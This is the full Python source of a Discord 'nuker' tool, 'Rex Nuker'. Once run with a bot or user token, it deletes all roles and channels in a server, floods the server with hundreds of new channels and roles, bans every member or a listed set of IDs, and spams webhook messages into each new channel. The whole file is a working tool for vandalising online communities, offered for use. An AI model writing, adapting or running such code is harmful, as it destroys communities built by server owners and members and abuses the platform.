import os, sys, discord, requests, json, threading, random, asyncio
from discord.ext import commands
from os import _exit
from time import sleep
from datetime import datetime

now = datetime.now()
ftime = now.strftime("%H:%M:%S")

session = requests.Session()

os.system("title Rex Nuker")

if sys.platform == "win32":
    clear = lambda: os.system("cls")
else:
    clear = lambda: os.system("clear")

with open("Rex/settings.json") as f:
    settings = json.load(f)
token = settings.get("Token")
prefix = settings.get("Prefix")
channel_names = settings.get("Channel Names")
role_names = settings.get("Role Names")
Webhook_users = settings.get("Webhook Usernames")
Webhook_contents = settings.get("Spam Messages")
bot = settings.get("Bot")

if bot:
  headers = {
    "Authorization": 
      f"Bot {token}"
  }
else:
  headers = {
    "Authorization": 
      token
  }

rex = commands.Bot(
    command_prefix=prefix, 
    intents=discord.Intents.all(),
    help_command=None
)

def menu():
    clear()
    print(
    rex_logo
    )

@rex.event
async def on_ready():
    try:
       await rex.change_presence(
         status=discord.Status.invisible
        )
    except Exception:
      pass
    menu()

@rex.command(
  aliases=["NUKE", "nn", "nuke", "hi"]
  )
async def destroy(ctx):
    try:
       await ctx.message.delete()
       guild = ctx.guild.id
    except:
      print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mConnection error.")
      sleep(10)
      _exit(0)
    
    def delete_role(i):
        session.delete(
          f"https://discord.com/api/v9/guilds/{guild}/roles/{i}",
          headers=headers
        )
    
    def delete_channel(i):
        session.delete(
          f"https://discord.com/api/v9/channels/{i}",
          headers=headers
        )
    
    def create_channels(i):
        json = {
          "name": i
        }
        session.post(
          f"https://discord.com/api/v9/guilds/{guild}/channels",
          headers=headers,
          json=json
        )
  
    def create_roles(i):
        json = {
          "name": i
        }
        session.post(
          f"https://discord.com/api/v9/guilds/{guild}/roles",
          headers=headers,
          json=json
        )
    
    try:
       for i in range(3):
         for role in list(ctx.guild.roles):
             threading.Thread(
               target=delete_role,
               args=(role.id, )
             ).start()
             #print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mCreated thread with a count of {threading.active_count()} active threads.")
             print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mDeleted role {role}.")
    
       for i in range(3):
         for channel in list(ctx.guild.channels):
             threading.Thread(
               target=delete_channel,
               args=(channel.id, )
             ).start()
             #print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mCreated thread with a count of {threading.active_count()} active threads.")
             print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mDeleted channel {channel}.")
     
       for i in range(100):
           threading.Thread(
             target=create_channels,
             args=(random.choice(channel_names), )
           ).start()
           #print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mCreated thread with a count of {threading.active_count()} active threads.")
           print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mCreated channel {random.choice(channel_names)}.")
       
       sleep(3)
       
       for i in range(500):
           threading.Thread(
             target=create_roles,
             args=(random.choice(role_names), )
           ).start()
           #print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mCreated thread with a count of {threading.active_count()} active threads")
           print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mCreated role {random.choice(role_names)}.")


       for i in range(500):
           threading.Thread(
             target=create_channels,
             args=(random.choice(channel_names), )
             ).start()
             #print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mCreated channel {random.choice(channel_names)}.")
    except Exception as error:
      print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mConnection error" + error)
      sleep(10)
      _exit(0)

@rex.command(
  aliases=["ban", "banall", "ww", "bb"]
  )
async def massban(ctx):
    try:
       await ctx.message.delete()
       guild = ctx.guild.id
    except:
      print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mConnection error.")
      sleep(10)
      _exit(0)
    
    def mass_ban(i):
        sessions = requests.Session()
        sessions.put(
          f"https://discord.com/api/v9/guilds/{guild}/bans/{i}",
          headers=headers
        )
    try:
       for i in range(3):
         for member in list(ctx.guild.members):
             threading.Thread(
               target=mass_ban,
               args=(member.id, )
             ).start()
             #print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mCreated thread with a count of {threading.active_count()} threads")
             print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mExecuted member {member}.")
       clear()
       menu()
       print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mOperation mass ban successful.")
    except Exception as error:
      print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mConnection error" + error)
      sleep(10)
      _exit(0)

@rex.command()
async def testban(ctx):
    try:
       await ctx.message.delete()
       guild = ctx.guild.id
       users = open("Rex/ids.txt")
    except:
      print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mConnection error.")
      sleep(10)
      _exit(0)
    
    def mass_ban(x):
        sessions = requests.Session()
        sessions.put(
          f"https://discord.com/api/v9/guilds/{guild}/bans/{x}",
          headers=headers
        )
    try:
       for x in users:
           workers = []
           threading.Thread(
             target=mass_ban,
             args=(x, )
           ).start()
           print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mCreated thread with a count of {threading.active_count()} active threads")
           #print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mExecuted member {x}")
       clear()
       menu()
       print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mOperation test ban successful.")
    except Exception as error:
      print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mConnection error" + error)
      sleep(10)
      _exit(0)

@rex.event
async def on_guild_channel_create(channel):
    try:
       webhook = await channel.create_webhook(name="Wizzed")
       for i in range(120):
           await webhook.send(random.choice(Webhook_contents))
           print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mCreated and spammed webhook {i} times.")
       print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mOperation nuke successful.")
       clear()
       menu()
    except Exception:
      pass

rex_logo = f"""
                              \033[38;5;160m     Social404
                              \033[38;5;88m██████╗ ███████╗██╗  ██╗
                              \033[38;5;89m██╔══██╗██╔════╝╚██╗██╔╝
                              \033[38;5;90m██████╔╝█████╗   ╚███╔╝ 
                              \033[38;5;91m██╔══██╗██╔══╝   ██╔██╗ 
                              \033[38;5;92m██║  ██║███████╗██╔╝ ██╗
                              \033[38;5;93m╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                        \033[38;5;90m═══════════════════════════════════
                  \033[38;5;90m═══════════════════════════════════════════════
Made By Krypton
Commands; {prefix}destroy ~ {prefix}massban ~ {prefix}testban
Client; {rex.user}
Prefix; {prefix}
"""

if __name__ == "__main__":
    clear()
    #print("\033[38;5;92m" + license)
    #sleep(3)
    clear()
    print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mLoading client.")
    try:
      rex.run(
        token, 
        bot=bot
      )
    except Exception:
      print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mSpecified a wrong token or a bot token without all intents.")
      sleep(10)
      _exit(0)
